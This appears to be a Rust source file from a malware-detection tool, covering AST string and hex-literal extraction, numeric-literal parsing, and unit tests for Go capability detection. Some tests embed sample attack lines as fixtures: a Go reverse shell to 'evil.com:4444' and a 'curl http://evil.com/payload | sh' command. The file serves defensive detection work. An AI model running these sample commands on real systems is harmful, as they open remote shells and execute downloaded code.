            value: s.to_string().into(),
            offset: Some(offset),
            string_type: None,
            encoding: "utf-8".to_string(),
            section: Some("ast".to_string()),
            encoding_chain: Vec::new(),
            fragments: None,
        };
        push_unique_string(report, seen_strings, literal);

        // stng intentionally uses a conservative threshold
        // when decoding arbitrary byte runs. In minified source,
        // however, its raw scan often sees the whole line rather
        // than the individual quoted values. Decode compact,
        // syntactically confirmed hex string literals here so
        // obfuscated API names such as `createDecipher` and
        // `_compile` remain available to `type: encoded` rules.
        // Requiring six printable decoded bytes rejects hashes,
        // keys, color values, and arbitrary binary material.
        if let Some(decoded) = decode_printable_hex_literal(s) {
            let decoded = StringInfo {
                value: decoded.into(),
                offset: Some(offset),
                string_type: None,
                encoding: "utf-8".to_string(),
                section: Some("decoded".to_string()),
                encoding_chain: vec!["hex".to_string()],
                fragments: None,
            };
            push_unique_string(report, seen_strings, decoded);
        }
    }

    fn extract_function_name<'a>(
        &self,
        node: &tree_sitter::Node<'a>,
        source: &[u8],
    ) -> Option<String> {
        // Try the configured field name first
        if let Some(name_node) = node.child_by_field_name(self.config.function_name_field)
            && let Ok(name) = name_node.utf8_text(source)
            && !name.is_empty()
        {
            return Some(name.to_string());
        }

        // Fallback: look for identifier children
        let mut cursor = node.walk();
        if cursor.goto_first_child() {
            loop {
                let child = cursor.node();
                if (child.kind() == "identifier" || child.kind() == "name")
                    && let Ok(name) = child.utf8_text(source)
                    && !name.is_empty()
                {
                    return Some(name.to_string());
                }
                if !cursor.goto_next_sibling() {
                    break;
                }
            }
        }
        None
    }
}

/// Decode a parser-confirmed hexadecimal string literal when it yields a
/// meaningful printable ASCII token. This is deliberately narrower than a
/// generic hex decoder: source literals are already isolated from comments and
/// surrounding syntax, and six decoded bytes is enough for concealed API names
/// while excluding short colors and numeric constants.
fn decode_printable_hex_literal(value: &str) -> Option<String> {
    const MIN_DECODED_LEN: usize = 6;

    if value.len() < MIN_DECODED_LEN * 2 || !value.len().is_multiple_of(2) {
        return None;
    }
    if !value.bytes().all(|byte| byte.is_ascii_hexdigit()) {
        return None;
    }

    let mut decoded = Vec::with_capacity(value.len() / 2);
    for pair in value.as_bytes().chunks_exact(2) {
        let pair = std::str::from_utf8(pair).ok()?;
        decoded.push(u8::from_str_radix(pair, 16).ok()?);
    }
    if !decoded.iter().all(|byte| matches!(byte, 0x20..=0x7e)) {
        return None;
    }

    String::from_utf8(decoded).ok()
}

/// Heuristic: tree-sitter node names that correspond to integer
/// numeric literals across our supported grammars. Generic enough to
/// avoid per-language config; the parser fails fast on non-numeric
/// matches via [`parse_numeric_literal`].
#[inline]
fn is_numeric_node_kind(kind: &str) -> bool {
    // Skip float-family kinds: numeric-literal matching is integer-only
    // (chmod 0o777, port 4444, sentinel 0xDEADBEEF). Floats would need
    // their own parsing path and aren't a malware-rule target.
    if kind.contains("float") || kind.contains("real") {
        return false;
    }
    kind == "number"
        || kind == "integer"
        || kind.contains("integer_literal")
        || kind.contains("int_literal")
        || kind.contains("number_literal")
}

/// Parse a numeric-literal source text into `(value, radix)`. Returns
/// `None` for unparseable input (floats, BigInts, weird suffixes).
///
/// Detects the source-written radix from prefix:
///   - `0x` / `0X`  → 16
///   - `0o` / `0O`  → 8
///   - `0b` / `0B`  → 2
///   - else         → 10
///
/// Strips underscores (Rust/Python/JS use them as digit separators) and
/// common integer suffixes (`u8`, `i64`, `L`, `n` for BigInt, `i` for
/// imaginary). Returns `None` rather than truncating on overflow.
fn parse_numeric_literal(text: &str) -> Option<(i64, u32)> {
    // Reject floating-point shapes that slipped through the node-kind filter.
    if text.contains('.') || text.contains('e') || text.contains('E') {
        // 'e'/'E' guard would false-reject hex literals like 0xE5 — only apply
        // when we haven't yet seen an 0x prefix.
        if !(text.starts_with("0x") || text.starts_with("0X")) {
            return None;
        }
        if text.contains('.') {
            return None;
        }
    }
    let (rest, radix) = if let Some(s) = text.strip_prefix("0x").or_else(|| text.strip_prefix("0X"))
    {
        (s, 16u32)
    } else if let Some(s) = text.strip_prefix("0o").or_else(|| text.strip_prefix("0O")) {
        (s, 8u32)
    } else if let Some(s) = text.strip_prefix("0b").or_else(|| text.strip_prefix("0B")) {
        (s, 2u32)
    } else {
        (text, 10u32)
    };
    // Strip digit separators + the most common integer-type suffixes that
    // appear in source-language literals. Anything that wouldn't be a
    // valid digit-in-this-radix character is dropped so suffixes like
    // `_u32`, `L`, `n` (BigInt), `i` (imaginary) don't break parsing.
    let cleaned: String = rest
        .chars()
        .take_while(|c| c.is_digit(radix) || *c == '_')
        .filter(|c| *c != '_')
        .collect();
    if cleaned.is_empty() {
        return None;
    }
    i64::from_str_radix(&cleaned, radix)
        .ok()
        .map(|v| (v, radix))
}

#[cfg(test)]
mod numeric_literal_tests {
    use super::{decode_printable_hex_literal, is_numeric_node_kind, parse_numeric_literal};

    #[test]
    fn decodes_compact_printable_hex_source_literals() {
        assert_eq!(
            decode_printable_hex_literal("6372656174654465636970686572").as_deref(),
            Some("createDecipher")
        );
        assert_eq!(
            decode_printable_hex_literal("5f636f6d70696c65").as_deref(),
            Some("_compile")
        );
    }

    #[test]
    fn rejects_short_or_binary_hex_source_literals() {
        assert_eq!(decode_printable_hex_literal("686578"), None);
        assert_eq!(decode_printable_hex_literal("deadbeefdeadbeef"), None);
        assert_eq!(decode_printable_hex_literal("not-hexadecimal"), None);
    }

    #[test]
    fn parse_decimal_octal_hex_binary() {
        assert_eq!(parse_numeric_literal("4444"), Some((4444, 10)));
        assert_eq!(parse_numeric_literal("0o777"), Some((511, 8)));
        assert_eq!(parse_numeric_literal("0xDEADBEEF"), Some((0xDEADBEEF, 16)));
        assert_eq!(parse_numeric_literal("0b1010"), Some((10, 2)));
    }

    #[test]
    fn parse_rejects_floats() {
        assert_eq!(parse_numeric_literal("3.14"), None);
        assert_eq!(parse_numeric_literal("1e10"), None);
    }

    #[test]
    fn parse_strips_digit_separators_and_suffixes() {
        assert_eq!(parse_numeric_literal("1_000_000"), Some((1_000_000, 10)));
        assert_eq!(parse_numeric_literal("4444u16"), Some((4444, 10)));
        assert_eq!(
            parse_numeric_literal("0xDEAD_BEEFi64"),
            Some((0xDEADBEEF, 16))
        );
    }

    #[test]
    fn is_numeric_node_kind_matches_known_grammars() {
        assert!(is_numeric_node_kind("number"));
        assert!(is_numeric_node_kind("integer"));
        assert!(is_numeric_node_kind("integer_literal"));
        assert!(is_numeric_node_kind("int_literal"));
        assert!(is_numeric_node_kind("number_literal"));
        assert!(is_numeric_node_kind("hex_integer_literal"));
        assert!(is_numeric_node_kind("decimal_integer_literal"));
        assert!(!is_numeric_node_kind("float_literal"));
        assert!(!is_numeric_node_kind("real_literal"));
        assert!(!is_numeric_node_kind("string"));
        assert!(!is_numeric_node_kind("identifier"));
    }
}

impl Analyzer for UnifiedSourceAnalyzer {
    fn analyze_input(&self, input: &AnalysisInput<'_>) -> Result<AnalysisReport> {
        // Handle UTF-16 encoding (same as analyze())
        let bytes: std::borrow::Cow<'_, [u8]> =
            if input.data.len() >= 2 && input.data[0] == 0xFF && input.data[1] == 0xFE {
                // UTF-16 LE BOM
                use encoding_rs::UTF_16LE;
                let (decoded, _, _) = UTF_16LE.decode(&input.data[2..]);
                std::borrow::Cow::Owned(decoded.into_owned().into_bytes())
            } else if input.data.len() >= 2 && input.data[0] == 0xFE && input.data[1] == 0xFF {
                // UTF-16 BE BOM
                use encoding_rs::UTF_16BE;
                let (decoded, _, _) = UTF_16BE.decode(&input.data[2..]);
                std::borrow::Cow::Owned(decoded.into_owned().into_bytes())
            } else {
                std::borrow::Cow::Borrowed(input.data)
            };

        let content = String::from_utf8_lossy(&bytes);

        // Pass pre-extracted stng strings and payloads to avoid redundant extraction.
        // Merge cancellation: prefer struct field (set via builder), fall back to input field
        // (set by the server when it doesn't go through analyzer_for_file_type_arc).
        let effective_cancellation = self.cancellation.as_ref().or(input.cancellation.as_ref());
        // Reuse the threaded context only when it covers the exact bytes we
        // analyze (no UTF-16/lossy normalization); otherwise open one on the
        // normalized `content`. The two contexts have different byte lifetimes,
        // so each branch makes its own call rather than merging into one option.
        let reuse = content.as_bytes() == input.data;
        match input.parsed_ctx.as_ref() {
            Some(ctx) if reuse => Ok(self.analyze_source_impl(
                input.path,
                &content,
                input.strings,
                input.payloads,
                input.sha256.clone(),
                effective_cancellation,
                Some(ctx),
            )),
            _ => {
                let owned_ctx =
                    crate::analysis_context::AnalysisContext::open(input.path, content.as_bytes())
                        .ok();
                Ok(self.analyze_source_impl(
                    input.path,
                    &content,
                    input.strings,
                    input.payloads,
                    input.sha256.clone(),
                    effective_cancellation,
                    owned_ctx.as_ref(),
                ))
            }
        }
    }

    fn analyze(&self, file_path: &Path) -> Result<AnalysisReport> {
        // Use smart file reading with automatic UTF-16 normalization
        let data = crate::file_io::read_file_normalized(file_path)?;
        let bytes = data.as_slice();

        let content = String::from_utf8_lossy(bytes);
        Ok(self.analyze_source(file_path, &content))
    }

    fn can_analyze(&self, _file_path: &Path) -> bool {
        true
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use super::*;
    use crate::analyzers::FileType;
    use std::path::PathBuf;
    use tempfile::NamedTempFile;

    #[test]
    fn test_python_analysis() {
        let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::Python).unwrap();
        let path = PathBuf::from("test.py");
        let code = r#"
import os

def main():
    os.system("echo hello")
    print("world")

if __name__ == "__main__":
    main()
"#;
        let report = analyzer.analyze_source(&path, code);
        assert!(report.structure.iter().any(|s| s.id.contains("python")));
        assert!(!report.functions.is_empty());
        assert!(!report.strings.is_empty());
    }

    /// A string literal's recorded offset must point at the first byte of its
    /// (quote-stripped) value, not at the opening quote. Otherwise a downstream
    /// span of `[offset, value.len()]` is shifted one byte left and highlights
    /// `"gzi` instead of `gzip` (regression: lab.atomdrift.org off-by-one).
    #[test]
    fn test_string_literal_offset_excludes_quote() {
        let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::JavaScript).unwrap();
        let path = PathBuf::from("test.js");
        let code = r#"const algorithm = "gzip";"#;
        let report = analyzer.analyze_source(&path, code);

        let s = report
            .strings
            .iter()
            .find(|s| &*s.value == "gzip")
            .expect("expected a 'gzip' string literal");
        let off = s.offset.expect("string literal should record an offset") as usize;
        let span = &code.as_bytes()[off..off + s.value.len()];
        assert_eq!(
            span,
            b"gzip",
            "offset {off} + len {} spans {:?}, expected b\"gzip\"",
            s.value.len(),
            String::from_utf8_lossy(span),
        );
    }

    #[test]
    fn test_javascript_analysis() {
        let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::JavaScript).unwrap();
        let path = PathBuf::from("test.js");
        let code = r#"
const http = require('http');

function fetchData(url) {
    return http.get(url);
}

const handler = async () => {
    await fetchData("http://example.com");
};
"#;
        let report = analyzer.analyze_source(&path, code);
        assert!(report.structure.iter().any(|s| s.id.contains("javascript")));
        assert!(!report.functions.is_empty());
    }

    #[test]
    fn one_walk_collects_functions_strings_and_call_imports() {
        let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::JavaScript).unwrap();
        let path = PathBuf::from("one-walk.js");
        let code = r#"
function fetchData(url) {
    return eval(url);
}
const algorithm = "gzip";
"#;
        let report = analyzer.analyze_source(&path, code);
        assert!(
            report.functions.iter().any(|f| f.name == "fetchData"),
            "function walk must still see fetchData: {:?}",
            report.functions.iter().map(|f| &f.name).collect::<Vec<_>>()
        );
        assert!(
            report.strings.iter().any(|s| &*s.value == "gzip"),
            "string walk must still see gzip"
        );
        assert!(
            report.imports.iter().any(|i| i.symbol == "eval"),
            "call walk must still record eval: {:?}",
            report.imports.iter().map(|i| &i.symbol).collect::<Vec<_>>()
        );
    }

    #[test]
    fn ast_string_literals_dedup_string_and_fragment() {
        let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::JavaScript).unwrap();
        let path = PathBuf::from("dedup.js");
        let report = analyzer.analyze_source(&path, r#"const algorithm = "gzip";"#);
        let gzip = report
            .strings
            .iter()
            .filter(|s| &*s.value == "gzip" && s.section.as_deref() == Some("ast"))
            .count();
        assert_eq!(
            gzip, 1,
            "string + string_fragment must not double-count gzip"
        );
    }

    #[test]
    fn ast_string_literals_keep_distinct_offsets() {
        let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::JavaScript).unwrap();
        let path = PathBuf::from("many-strings.js");
        let mut code = String::from("const o = {\n");
        for i in 0..500 {
            code.push_str(&format!("  k{i}: \"v{i}\",\n"));
        }
        code.push_str("};\n");
        let report = analyzer.analyze_source(&path, &code);
        let ast = report
            .strings
            .iter()
            .filter(|s| s.section.as_deref() == Some("ast"))
            .count();
        assert_eq!(ast, 500, "each quoted literal stays unique: {ast}");
    }

    #[test]
    fn test_go_analysis() {
        let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::Go).unwrap();
        let path = PathBuf::from("test.go");
        let code = r#"
package main

import "fmt"

func main() {
    fmt.Println("Hello, World!")
}
"#;
        let report = analyzer.analyze_source(&path, code);
        assert!(report.structure.iter().any(|s| s.id.contains("go")));
        assert!(!report.functions.is_empty());
    }

    #[test]
    fn test_all_languages_have_configs() {
        // Ensure all source code file types have configurations
        let types = vec![
            FileType::Python,
            FileType::JavaScript,
            FileType::TypeScript,
            FileType::Go,
            FileType::Rust,
            FileType::Ruby,
            FileType::Php,
            FileType::Shell,
            FileType::Lua,
            FileType::Perl,
            FileType::PowerShell,
            FileType::Java,
            FileType::CSharp,
            FileType::C,
            FileType::Swift,
            FileType::ObjectiveC,
            FileType::Groovy,
            FileType::Scala,
            FileType::Zig,
            FileType::Elixir,
        ];

        for ft in types {
            assert!(
                config_for_file_type(&ft).is_some(),
                "Missing config for {:?}",
                ft
            );
        }
    }

    // Go-specific capability detection tests
    // These verify the unified analyzer correctly detects Go capabilities via the trait system

    fn go_test_mapper() -> crate::capabilities::CapabilityMapper {
        let yaml = r#"
defaults:
  platforms: [linux, macos, windows, unix, android, ios, appliance, routeros, fortios]
  for: [go]
traits:
  - id: micro-behaviors/process/create/direct::exec-command
    desc: Executes commands via Go os/exec
    crit: suspicious
    conf: 0.95
    if:
      type: symbol
      exact: exec.Command

  - id: micro-behaviors/process/create/direct::syscall-exec
    desc: Executes commands via Go syscall.Exec
    crit: suspicious
    conf: 0.95
    if:
      type: symbol
      exact: syscall.Exec

  - id: micro-behaviors/communications/socket/connect::dial
    desc: Go net.Dial call
    crit: baseline
    conf: 0.95
    if:
      type: symbol
      exact: net.Dial

  - id: micro-behaviors/communications/socket/listen::listen-go
    desc: Go net.Listen call
    crit: baseline
    conf: 0.95
    if:
      type: symbol
      exact: net.Listen

  - id: micro-behaviors/communications/http/get::http-get
    desc: Go http.Get call
    crit: baseline
    conf: 0.95
    if:
      type: symbol
      exact: http.Get

  - id: micro-behaviors/communications/http/server::listenandserve-call
    desc: Go http.ListenAndServe call
    crit: baseline
    conf: 0.95
    if:
      type: symbol
      exact: http.ListenAndServe

  - id: micro-behaviors/crypto/library::aes-new-cipher
    desc: Go AES cipher construction
    crit: baseline
    conf: 0.95
    if:
      type: symbol
      exact: aes.NewCipher

  - id: micro-behaviors/crypto/library::rsa-generate-key
    desc: Go RSA key generation
    crit: baseline
    conf: 0.95
    if:
      type: symbol
      exact: rsa.GenerateKey

  - id: micro-behaviors/fs/file/operations::os-create
    desc: Go file creation
    crit: baseline
    conf: 0.95
    if:
      type: symbol
      exact: os.Create
"#;

        let mut file = NamedTempFile::new().expect("create temp yaml");
        std::io::Write::write_all(&mut file, yaml.as_bytes()).expect("write temp yaml");
        crate::capabilities::CapabilityMapper::from_yaml_with_precision_thresholds(
            file.path(),
            crate::capabilities::CapabilityMapper::DEFAULT_MIN_HOSTILE_PRECISION,
            crate::capabilities::CapabilityMapper::DEFAULT_MIN_SUSPICIOUS_PRECISION,
            false,
        )
        .expect("load test-local go mapper")
    }

    fn analyze_go_code(code: &str) -> crate::types::AnalysisReport {
        let mapper = go_test_mapper();
        let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::Go)
            .unwrap()
            .with_capability_mapper(mapper);
        let path = PathBuf::from("test.go");
        analyzer.analyze_source(&path, code)
    }

    #[test]
    fn test_detect_exec_command() {
        let code = r#"
package main
import "os/exec"
func main() {
    cmd := exec.Command("ls", "-la")
    cmd.Run()
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/process/create/direct::exec-command"),
            "Expected micro-behaviors/process/create/direct::exec-command, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_syscall_exec() {
        let code = r#"
package main
import "syscall"
func main() {
    syscall.Exec("/bin/sh", []string{}, nil)
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/process/create/direct::syscall-exec"),
            "Expected micro-behaviors/process/create/direct::syscall-exec, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_reverse_shell() {
        let code = r#"
package main
import ("net"; "os/exec")
func main() {
    conn, _ := net.Dial("tcp", "evil.com:4444")
    cmd := exec.Command("/bin/sh")
    cmd.Stdin = conn
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/communications/socket/connect::dial"),
            "Expected micro-behaviors/communications/socket/connect::dial, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/process/create/direct::exec-command"),
            "Expected micro-behaviors/process/create/direct::exec-command, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_net_listen() {
        let code = r#"
package main
import "net"
func main() {
    ln, _ := net.Listen("tcp", ":8080")
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/communications/socket/listen::listen-go"),
            "Expected micro-behaviors/communications/socket/listen::listen-go, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_net_dial() {
        let code = r#"
package main
import "net"
func main() {
    conn, _ := net.Dial("tcp", "example.com:80")
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/communications/socket/connect::dial"),
            "Expected micro-behaviors/communications/socket/connect::dial, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_http_get() {
        let code = r#"
package main
import "net/http"
func main() {
    resp, _ := http.Get("https://example.com")
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/communications/http/get::http-get"),
            "Expected micro-behaviors/communications/http/get::http-get, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_http_server() {
        let code = r#"
package main
import "net/http"
func main() {
    http.ListenAndServe(":8080", nil)
}
"#;
        let report = analyze_go_code(code);
        // The ListenAndServe call should be detected as a dedicated trait
        assert!(
            report.findings.iter().any(|c| c.id
                == "micro-behaviors/communications/http/server::go-http-server"
                || c.id == "micro-behaviors/communications/http/server::listenandserve-call"),
            "Expected go-http-server or listenandserve-call, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_aes_encryption() {
        let code = r#"
package main
import "crypto/aes"
func main() {
    key := []byte("secret")
    block, _ := aes.NewCipher(key)
    _ = block
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report.findings.iter().any(|c| {
                c.id == "micro-behaviors/crypto/library::aes-new-cipher"
                    || c.id == "micro-behaviors/crypto/library/signals::aes-new-cipher"
            }),
            "Expected micro-behaviors/crypto/library::aes-new-cipher or micro-behaviors/crypto/library/signals::aes-new-cipher, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_rsa_encryption() {
        let code = r#"
package main
import "crypto/rsa"
func main() {
    key, _ := rsa.GenerateKey(rand.Reader, 2048)
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report.findings.iter().any(|c| {
                c.id == "micro-behaviors/crypto/library::rsa-generate-key"
                    || c.id == "micro-behaviors/crypto/library/signals::rsa-generate-key"
            }),
            "Expected micro-behaviors/crypto/library::rsa-generate-key or micro-behaviors/crypto/library/signals::rsa-generate-key, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_file_write() {
        let code = r#"
package main
import "os"
func main() {
    f, _ := os.Create("test.txt")
    f.WriteString("data")
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/fs/file/operations::os-create"),
            "Expected micro-behaviors/fs/file/operations::os-create, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_go_structural_feature() {
        let code = "package main\nfunc main() {}";
        let report = analyze_go_code(code);
        assert!(
            report
                .structure
                .iter()
                .any(|s| s.id == "source/language/go")
        );
    }

    #[test]
    fn test_go_extract_functions() {
        let code = r#"
package main

func hello() string {
    return "world"
}

func main() {
    hello()
}
"#;
        let report = analyze_go_code(code);
        assert!(report.functions.len() >= 2);
        assert!(report.functions.iter().any(|f| f.name == "hello"));
        assert!(report.functions.iter().any(|f| f.name == "main"));
    }

    #[test]
    fn test_go_multiple_capabilities() {
        let code = r#"
package main
import ("os/exec"; "net/http"; "os")

func main() {
    exec.Command("whoami").Run()
    http.Get("https://evil.com")
    os.Remove("/tmp/file")
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report.findings.len() >= 2,
            "Expected >= 2 findings, found: {}",
            report.findings.len()
        );
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/process/create/direct::exec-command"),
            "Expected micro-behaviors/process/create/direct::exec-command"
        );
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/communications/http/get::http-get"),
            "Expected micro-behaviors/communications/http/get::http-get"
        );
    }

    /// Regression test for rayon deadlock when embedded code detection
    /// triggers recursive `analyze_source_impl` from within a saturated
    /// rayon thread pool. Before the fix, the inner `rayon::in_place_scope`
    /// would wait forever for a free thread that could never appear.
    #[test]
    fn test_embedded_code_no_deadlock_under_rayon_pressure() {
        use rayon::prelude::*;
        use std::sync::mpsc;

        // Python code large enough to trigger embedded code detection
        // (> MIN_PLAIN_SIZE=50 bytes, with multiple language indicators)
        let embedded_python = r#"import os
import sys
def exploit():
    os.system('curl http://evil.com/payload | sh')
    sys.exit(0)
exploit()"#;

        // A shell script that contains the embedded Python as a string
        let shell_script = format!(
            "#!/bin/bash\necho '{}'\ncurl http://example.com\n",
            embedded_python
        );

        // Use a small thread pool to make deadlock more likely
        let pool = rayon::ThreadPoolBuilder::new()
            .num_threads(2)
            .build()
            .unwrap();

        let (tx, rx) = mpsc::channel();

        pool.spawn(move || {
            // Saturate both threads with par_iter, each analyzing a script
            // that may trigger embedded code detection → recursive analysis
            let items: Vec<_> = (0..4).collect();
            items.par_iter().for_each(|i| {
                #[allow(clippy::expect_used)]
                let analyzer =
                    UnifiedSourceAnalyzer::for_file_type(&FileType::Shell).expect("shell analyzer");
                let path = PathBuf::from(format!("test_{}.sh", i));
                let _report = analyzer.analyze_source(&path, &shell_script);
            });
            let _ = tx.send(());
        });

        // If the deadlock is present, this will hang forever.
        // 30 seconds is very generous — normal completion is <1s.
        let result = rx.recv_timeout(std::time::Duration::from_secs(30));
        assert!(
            result.is_ok(),
            "Timed out — likely deadlock in embedded code detection under rayon pressure"
        );
    }
}
